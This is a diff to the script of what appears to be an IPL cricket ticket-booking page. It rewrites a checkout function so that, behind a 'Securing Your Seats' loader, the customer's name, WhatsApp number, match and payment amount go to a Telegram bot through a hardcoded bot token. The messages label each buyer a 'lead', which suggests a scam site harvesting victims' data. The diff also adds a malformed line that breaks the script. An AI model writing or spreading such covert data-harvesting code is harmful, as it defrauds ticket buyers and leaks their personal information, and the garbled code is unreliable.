@@ -351,52 +351,68 @@
             localStorage.setItem("seatQuantity", window.sQty);
         }
 
+        .gowindowNext = () => { 
         window.goNext = () => { 
-            if (window.sPrice > 0) {
-                
-                const btn = document.getElementById('final-btn');
-                if(btn) {
-                    btn.innerText = "Processing...";
-                    btn.style.pointerEvents = "none";
-                }
+    if (window.sPrice > 0) {
+        
+        const btn = document.getElementById('final-btn');
+        if(btn) {
+            btn.innerText = "Processing...";
+            btn.style.pointerEvents = "none";
+        }
 
-                const loader = document.createElement('div');
-                loader.innerHTML = `
-                    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
-                        <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
-                        <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
-                        <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to gateway</p>
-                        <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-                    </div>
-                `;
-                document.body.appendChild(loader);
+        const loader = document.createElement('div');
+        loader.innerHTML = `
+            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
+                <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
+                <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
+                <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to details</p>
+                <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+            </div>
+        `;
+        document.body.appendChild(loader);
 
-                const name = localStorage.getItem('customerName') || "Unknown";
-                const phone = localStorage.getItem('customerPhone') || "Unknown";
-                const matchTitle = document.getElementById('match-title').innerText || "IPL Match";
-                const seatType = document.getElementById('res-type').innerText;
-                const totalAmt = window.sQty * window.sPrice;
+        const name = localStorage.getItem('customerName') || "Unknown";
+        const phone = localStorage.getItem('customerPhone') || "Unknown";
+        
+        // Error se bachne ke liye chota sa check laga diya hai
+        const matchTitleEl = document.getElementById('match-title');
+        const matchTitle = matchTitleEl ? matchTitleEl.innerText : "IPL Match";
+        
+        const resTypeEl = document.getElementById('res-type');
+        const seatType = resTypeEl ? resTypeEl.innerText : window.sType;
+        
+        const totalAmt = window.sQty * window.sPrice;
 
-                const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-                const chatId = "6820660513"; 
-                
-                const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${seatType}\n💵 Total Amount: ₹${totalAmt}`;
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
+        const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+        const chatId = "6820660513"; 
+        
+        // 🔥 अपडेटेड हिंदी टेलीग्राम मैसेज 🔥
+        const telegramMsg = `🏠 <b>कस्टमर Address Page पर पहुँच गया!</b> 🏠\n\n` +
+                            `👤 <b>नाम (Name):</b> ${name}\n` +
+                            `📞 <b>नंबर (WhatsApp):</b> ${phone}\n` +
+                            `🏏 <b>मैच (Match):</b> ${matchTitle}\n` +
+                            `🎟️ <b>सीट (Seats):</b> ${window.sQty} x ${seatType}\n` +
+                            `💵 <b>कुल रकम (Total Amount):</b> ₹${totalAmt}`;
+        
+        // URL mein parse_mode=HTML add kar diya gaya hai
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=HTML`;
 
-                fetch(url).then(() => {
-                    window.location.href = "details.html";
-                }).catch(() => {
-                    window.location.href = "details.html";
-                });
+        fetch(url).then(() => {
+            window.location.href = "details.html";
+        }).catch(() => {
+            window.location.href = "details.html";
+        });
 
-                setTimeout(() => {
-                    window.location.href = "details.html";
-                }, 1200);
+        setTimeout(() => {
+            window.location.href = "details.html";
+        }, 1200);
 
-            } else {
-                alert("Kripya pehle seat type select karein!");
-            }
-        };
+    } else {
+        alert("Kripya pehle seat type select karein!");
+    }
+};
+            
     </script>
 
     <script type="module">
